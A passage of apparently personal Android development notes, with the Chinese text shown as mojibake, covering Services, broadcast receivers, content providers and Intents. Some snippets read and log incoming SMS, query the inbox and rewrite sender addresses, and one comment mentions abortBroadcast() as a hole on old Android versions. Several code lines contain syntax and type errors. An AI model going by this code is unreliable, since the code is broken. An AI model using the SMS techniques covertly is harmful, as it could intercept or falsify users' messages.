class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_stop);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_bind);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">button = findViewById(R.id.button_unbind);</span><br><span class="line">button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,MyCountService.class);</span><br><span class="line">    <span class="keyword">switch</span>(v.getId())&#123;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_start: <span class="comment">//å¯åŠ¨æœåŠ¡</span></span><br><span class="line">            startService(intent);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_stop:</span><br><span class="line">            stopService(intent);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_bind:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> R.id.button_unbind:</span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiverå¹¿æ’­æ¥æ”¶å™¨">BroadcastReceiverå¹¿æ’­æ¥æ”¶å™¨</h3><p>Androidç³»ç»Ÿä¸­çš„Broadcast Intent</p><ul><li>ç½‘ç»œçŠ¶æ€å˜åŒ–ï¼šandroid.net.conn.CONNECTIVITY_CHANGE</li><li>ç³»ç»Ÿå¯åŠ¨æˆåŠŸï¼šandroid.intent.action.BOOT_COMPLETED</li><li>ç”µæ± ç”µé‡å˜åŒ–ï¼šandroid.intent.action.BATTERY_CHANGED</li><li>å……ç”µï¼šandroid.intent.action.ACTION_POWER_CONNECTED,android.intent.action.ACTION_POWER_DISCONNECTED</li><li>æ”¶åˆ°çŸ­ä¿¡ï¼šandroid.provider.Telephony.SMS_RECEIVED</li></ul><h4 id="ç®€å•çš„ä¾‹å­">ç®€å•çš„ä¾‹å­</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button_send);</span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="comment">//å‘é€å¹¿æ’­ </span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;www.xxx.com&quot;</span>);</span><br><span class="line">        sendBroadcast(intent);   <span class="comment">//æ— åºå¹¿æ’­</span></span><br><span class="line">        sendOrderedBroadcast(intentï¼Œ<span class="literal">null</span>) <span class="comment">//æœ‰åºå¹¿æ’­ ç¬¬äºŒä¸ªå‚æ•°æ˜¯æƒé™ï¼Œå¯¹åº”è¦åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ (é™æ€)   </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//æ³¨å†Œå¹¿æ’­å¬ä¼— 1.åŠ¨æ€æ³¨å†Œ 2.é™æ€æ³¨å†Œ</span></span><br><span class="line"><span class="comment">//åŠ¨æ€æ³¨å†Œ</span></span><br><span class="line"><span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">filter.addAction(<span class="string">&quot;www.xxx.com&quot;</span>);</span><br><span class="line">registerReceiver(<span class="keyword">new</span> <span class="title class_">MyReceiver</span>(),filter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é™æ€æ³¨å†Œ</span></span><br><span class="line">é…ç½®æ–‡ä»¶ä¸­æ·»åŠ (æ— åº)</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.MyReceiver&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;www.xxx.com&quot;</span>/&gt;</span><br><span class="line">         &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;</span><br><span class="line">                </span><br><span class="line">é…ç½®æ–‡ä»¶ä¸­æ·»åŠ (æœ‰åº)</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.MyReceiver&quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter android:priority=<span class="string">&quot;5&quot;</span>&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;www.xxx.com&quot;</span>/&gt;</span><br><span class="line">         &lt;/intent-filter&gt;</span><br><span class="line">    &lt;/receiver&gt;              </span><br><span class="line">                </span><br><span class="line"><span class="comment">//æ–°å»ºä¸€ä¸ªç±» MyReceiver å¬ä¼—</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiver</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;onReceiver&quot;</span>);    </span><br><span class="line">        abortBroadcast(); <span class="comment">//ç»ˆæ­¢å¹¿æ’­ ä½ç‰ˆæœ¬å®‰å“ä¸€ä¸ªç®€å•æ¼æ´ é«˜ç‰ˆæœ¬å®‰å“ç³»ç»Ÿå·²ç»ä¿®å¤</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="çŸ­ä¿¡çš„å¹¿æ’­">çŸ­ä¿¡çš„å¹¿æ’­</h4><p>è·å¾—çŸ­ä¿¡å†…å®¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é™æ€æ³¨å†Œ</span></span><br><span class="line">é…ç½®æ–‡ä»¶ä¸­æ·»åŠ (æ— åº)</span><br><span class="line">    &lt;uses-permission android:name=<span class="string">&quot;android.permission.RECEIVE_SMS&quot;</span>/&gt;</span><br><span class="line">    &lt;receiver android:name=<span class="string">&quot;.SmsReceiver &quot;</span>&gt;</span><br><span class="line">        &lt;intent-filter&gt;</span><br><span class="line">        &lt;action android:name=<span class="string">&quot;android.provider.Telephony.SMS_RECEIVED/&gt;</span></span><br><span class="line"><span class="string">         &lt;/intent-filter&gt;</span></span><br><span class="line"><span class="string">    &lt;/receiver&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">//æ–°å»ºä¸€ä¸ªç±» SmsReceiver</span></span><br><span class="line"><span class="string">public class MyReceiver extends BroadcastReceiver&#123;</span></span><br><span class="line"><span class="string">    public void onReceiver(Context context,Intent intent)&#123;</span></span><br><span class="line"><span class="string">        Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>SmsReceiver<span class="string">&quot;);    </span></span><br><span class="line"><span class="string">        //abortBroadcast(); //ç»ˆæ­¢å¹¿æ’­ ä½ç‰ˆæœ¬å®‰å“ä¸€ä¸ªç®€å•æ¼æ´ é«˜ç‰ˆæœ¬å®‰å“ç³»ç»Ÿå·²ç»ä¿®å¤</span></span><br><span class="line"><span class="string">        //çŸ­ä¿¡ä¿¡æ¯ æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="string">        Bundle bundle = intent.getExtras();</span></span><br><span class="line"><span class="string">        Object[] pdus = (Object[]) bundle.get(&quot;</span>pdus<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        for(Object pdu ; pdus )&#123;</span></span><br><span class="line"><span class="string">            SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);</span></span><br><span class="line"><span class="string">            String address = message.getOriginatingAddress();</span></span><br><span class="line"><span class="string">            String body = message.getMessageBody();</span></span><br><span class="line"><span class="string">            Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>address:<span class="string">&quot;+address+&quot;</span>body:<span class="string">&quot;+body);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        //æ–¹æ³•äºŒï¼šä½¿ç”¨Telephony.Sms.Intents.getMessagesFromIntent(intent); è¦æ±‚ API19</span></span><br><span class="line"><span class="string">        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);</span></span><br><span class="line"><span class="string">        for(SmsMessage message ; smsMessages )&#123;</span></span><br><span class="line"><span class="string">            String address = message.getOriginatingAddress();</span></span><br><span class="line"><span class="string">            String body = message.getMessageBody();</span></span><br><span class="line"><span class="string">            Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>address:<span class="string">&quot;+address+&quot;</span>body:<span class="string">&quot;+body);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>å®‰å“8.0ä»¥ä¸Š éšå¼å¹¿æ’­(é…ç½®æ–‡ä»¶ä¸­)ä¸ä¸€å®šèµ·æ•ˆï¼Œä½†æ˜¾å¼å¹¿æ’­(åŠ¨æ€)ä¸€å®šå¯ä»¥ã€‚</p><h3 id="content-provider">content provider</h3><h4 id="ç®€å•ä¾‹å­">ç®€å•ä¾‹å­</h4><p>åˆ›å»ºä¸€ä¸ªMyProviderç±»ï¼Œé‡å†™ContentProviderç±»ï¼Œæ³¨å†Œå†…å®¹æä¾›è€…</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:authorities</span>=<span class="string">&quot;åŒ…å/www.51asm.com&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:name</span>=<span class="string">&quot;.MyProvider&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ–°å»ºä¸€ä¸ªå·¥ç¨‹ContentReceiverä½œä¸ºå†…å®¹æ¥å—è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">mContentResolver</span>  <span class="operator">=</span> getContentResolver();</span><br><span class="line"><span class="comment">//æ³¨å†Œå†…å®¹è§‚å¯Ÿè€… ä½¿ç”¨è§‚å¯Ÿè€…è¦åœ¨æä¾›è€…å‡º notifyAll()</span></span><br><span class="line">mContentResolver.registerContentObserver(Uri.parse(<span class="string">&quot;content://åŒ…å&quot;</span>),<span class="literal">true</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">button_insert</span> <span class="operator">=</span> findViewById(R.id.button_insert);</span><br><span class="line">button_insert.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">        values.put(<span class="string">&quot;SID&quot;</span>,<span class="string">&quot;S004&quot;</span>);</span><br><span class="line">        values.put(<span class="string">&quot;SNAME&quot;</span>,<span class="string">&quot;æ—¥å…‰&quot;</span>)       </span><br><span class="line">        mContentResolver.insert(Uri.parse(<span class="string">&quot;content://åŒ…å&quot;</span>),values);              </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="çŸ­ä¿¡">çŸ­ä¿¡</h4><p>åœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ç”¨æˆ·æƒé™<br><img src="/posts/7e4211d.htm/image-20231027144507100.png" alt="image-20231027144507100"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ManActivityä¸­ï¼š </span></span><br><span class="line">requestPermissions(<span class="keyword">new</span> <span class="title class_">String</span>[]  &#123;Manifest.permission.SEND_SMS,</span><br><span class="line">                                 Manifest.permission.READ_SMS&#125;,<span class="number">1000</span>)ï¼›</span><br><span class="line"><span class="comment">//SmsManager smsManager = SmsManager getDefault();</span></span><br><span class="line"><span class="comment">//smsManager.sendTextMessage(&quot;5556&quot;,null,&quot;msg&quot;,null,null);</span></span><br><span class="line"><span class="type">ContentResolver</span> <span class="variable">cr</span>  <span class="operator">=</span> getContentResolver();</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿®æ”¹çŸ­ä¿¡</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Contentvalues</span>();</span><br><span class="line">values.put(Telephony.Sms.Inbox.ADDRESS,<span class="string">&quot;100&quot;</span>);<span class="comment">//ç”µè¯ä¿®æ”¹ä¸º110</span></span><br><span class="line">cr.update(Telephony.Sms.Inbox.CONTENT_URI,values,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–çŸ­ä¿¡</span></span><br><span class="line"><span class="type">Cursor</span> <span class="variable">curson</span> <span class="operator">=</span> cr.query(Telephony.Sms.Inbox.CONTENT_URI,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexID</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox._ID);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexAddress</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexDate</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.DATE);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexBody</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.BODY);</span><br><span class="line">            <span class="type">String</span> <span class="variable">_ID</span> <span class="operator">=</span> cursor.getString(indexID);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ADDRESS</span> <span class="operator">=</span> cursor.getString(indexAddress);</span><br><span class="line">            <span class="type">Long</span> <span class="variable">DATE</span> <span class="operator">=</span> cursor.getLong(indexDate);</span><br><span class="line">            <span class="type">String</span> <span class="variable">BODY</span> <span class="operator">=</span> cursor.getString(indexBody);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//è½¬åŒ–æ—¶é—´æ ¼å¼ </span></span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM--dd hh:mm:ss&quot;</span>);</span><br><span class="line">            simpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>(DATE));</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;_ID:&quot;</span>+_ID+<span class="string">&quot; DATE:&quot;</span>+DATE+<span class="string">&quot; ADDRESS:&quot;</span>+ADDRESS+<span class="string">&quot; BODY:&quot;</span>+BODY);           </span><br><span class="line">        &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    Intent</p><h3 id="Intentï¼šæ‹¨æ‰“ç”µè¯">Intentï¼šæ‹¨æ‰“ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(Intent.Action_CALL);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;tel:120&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//manifestsä¸­è®¾ç½®ç”¨æˆ·æƒé™ &lt;uses-permission android:name=&quot;android.intent.action.CALL_PHONE&quot;/&gt;</span></span><br><span class="line"><span class="comment">//åœ¨Android 11 ä¸­æƒé™è®¾ç½®ä¸­æ‰‹åŠ¨ç»™è‡ªå®šä¹‰appæ‹¨æ‰“ç”µè¯çš„æƒé™</span></span><br></pre></td></tr></table></figure><h3 id="Intentï¼šæ‰“å¼€æµè§ˆå™¨">Intentï¼šæ‰“å¼€æµè§ˆå™¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(Intent.Action_VIEW );</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;ç½‘å€å†…å®¹&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Intentï¼šè®¾é—¹é’Ÿ">Intentï¼šè®¾é—¹é’Ÿ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(AlarmClock.ACTION_SET_ALARM)</span><br><span class="line">            .putExtra(AlarmClock.EXTRA_MESSAGE, message)</span><br><span class="line">.putExtra(AlarmClock.EXTRA_HOUR, hour)</span><br><span class="line">.putExtra(AlarmClock.EXTRA_MINUTES, minute);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ˜¾å¼Intent">æ˜¾å¼Intent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–intentæ•°æ® åœ¨loginactivityä¸­å†™ï¼š</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="type">String</span> <span class="variable">accout</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;key_account&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;key_password&quot;</span>);</span><br><span class="line">usernameEditText.setText(accout);</span><br><span class="line">passwordEditText.setText(password);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸»activityä¸­ï¼Œç»‘å®šä¸€ä¸ªbuttonç„¶åï¼š</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>,LoginActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">startActivity(intent); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœåœ¨loginç™»å½•æ¡†ä¸­è¾“å…¥çš„ä¿¡æ¯è¦è¿”å›åˆ°MainActivityä¸­ï¼Œ</p><p>åœ¨loginActivityä¸­çš„æŒ‰é’®äº‹ä»¶ä»£ç ä¸­æ·»åŠ ç›¸åº”åŠŸèƒ½ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>( );</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,usernameEditText.getText().toString());</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,passwordEditText.getText().toString());</span><br><span class="line">setResult(RESULT_OK,intent);</span><br><span class="line">finish();   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨MainActivityä¸­æ·»åŠ åŠŸèƒ½ä½¿å…¶çŸ¥é“loginactivityä½•æ—¶é”€æ¯ï¼Œç„¶åæ¥æ”¶ä¿¡æ¯ã€‚</p><p>startActivityForResult(intent)ï¼šæœŸæœ›åœ¨<strong>æ´»åŠ¨é”€æ¯</strong>çš„æ—¶å€™èƒ½å¤Ÿè¿”å›ä¸€ä¸ªç»“æœç»™ä¸Šä¸€ä¸ªæ´»åŠ¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//requestCode ==&gt; è¯·æ±‚ç ï¼ŒresultCode ==&gt; è¿”å›æ•°æ®æ—¶ä¼ å…¥çš„å¤„ç†ç»“æœ data == &gt;æºå¸¦ç€è¿”å›æ•°æ®çš„Intent</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, Intent data)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    <span class="keyword">if</span>(requestCode == <span class="number">1000</span> &amp;&amp; resultCode == RESULT_OK)&#123;  <span class="comment">//1000æ˜¯è¯·æ±‚ç </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">accout</span> <span class="operator">=</span> data.getStringExtra(<span class="string">&quot;key_account&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> data.getStringExtra(<span class="string">&quot;key_password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>,LoginActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">startActivityForResult(intent,<span class="number">1000</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨loginActivityä¸­</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>( );</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,usernameEditText.getText().toString());</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,passwordEditText.getText().toString());</span><br><span class="line">setResult(RESULT_OK,intent);</span><br><span class="line">finish();   <span class="comment">//é”€æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="éšå¼Intent">éšå¼Intent</h3><p>åœ¨é…ç½®æ–‡ä»¶ä¸­è‡ªå·±æ³¨å†Œæ„å›¾ï¼Œå¦‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">          <span 